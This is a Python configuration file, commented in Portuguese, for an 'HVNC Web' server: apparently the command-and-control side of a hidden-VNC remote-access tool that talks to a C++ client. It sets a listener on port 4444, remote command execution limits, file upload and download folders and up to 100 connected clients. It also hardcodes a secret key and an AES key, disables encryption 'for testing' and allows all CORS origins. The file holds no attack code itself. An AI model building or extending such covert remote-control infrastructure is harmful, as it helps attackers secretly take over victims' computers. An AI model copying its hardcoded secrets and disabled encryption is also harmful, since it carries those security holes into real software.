import os
from typing import Dict, Any

class Config:
    """Configurações do servidor HVNC Web"""
    
    # Configurações do servidor web
    HOST = "0.0.0.0"
    PORT = 8080
    DEBUG = True
    
    # Configurações do servidor HVNC (TCP)
    HVNC_HOST = "0.0.0.0"
    HVNC_PORT = 4444
    
    # Configurações de segurança
    SECRET_KEY = "hvnc-predador-2024-secret-key"
    CORS_ORIGINS = ["*"]
    
    # Configurações de criptografia (compatível com o cliente C++)
    USE_AES = False  # Desabilitado temporariamente para teste
    AES_KEY = b"MySecretKey12345"  # 16 bytes - mesmo do cliente
    
    # Configurações de imagem
    MAX_IMAGE_SIZE = 1920 * 1080 * 3  # RGB
    JPEG_QUALITY = 85
    
    # Configurações de WebSocket
    WS_PING_INTERVAL = 20
    WS_PING_TIMEOUT = 10
    
    # Configurações de logging
    LOG_LEVEL = "INFO"
    LOG_FORMAT = "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
    
    # Configurações de sessão
    SESSION_TIMEOUT = 3600  # 1 hora
    MAX_CLIENTS = 100
    
    # Configurações de arquivo
    UPLOAD_FOLDER = "uploads"
    DOWNLOAD_FOLDER = "downloads"
    TEMP_FOLDER = "temp"
    
    # Configurações de comando
    COMMAND_TIMEOUT = 30
    MAX_COMMAND_LENGTH = 1024
    
    @classmethod
    def get_config(cls) -> Dict[str, Any]:
        """Retorna todas as configurações como dicionário"""
        return {
            key: getattr(cls, key)
            for key in dir(cls)
            if not key.startswith('_') and not callable(getattr(cls, key))
        }
    
    @classmethod
    def from_env(cls):
        """Carrega configurações de variáveis de ambiente"""
        cls.HOST = os.getenv('HVNC_HOST', cls.HOST)
        cls.PORT = int(os.getenv('HVNC_PORT', cls.PORT))
        cls.DEBUG = os.getenv('HVNC_DEBUG', str(cls.DEBUG)).lower() == 'true'
        cls.SECRET_KEY = os.getenv('HVNC_SECRET_KEY', cls.SECRET_KEY)
        
        # Configurações de criptografia
        aes_key = os.getenv('HVNC_AES_KEY')
        if aes_key:
            cls.AES_KEY = aes_key.encode()[:16].ljust(16, b'\0')
        
        return cls

# Configurações específicas para desenvolvimento
class DevelopmentConfig(Config):
    DEBUG = True
    LOG_LEVEL = "DEBUG"

# Configurações específicas para produção
class ProductionConfig(Config):
    DEBUG = False
    LOG_LEVEL = "WARNING"
    CORS_ORIGINS = ["https://yourdomain.com"]

# Configuração padrão
config = Config.from_env()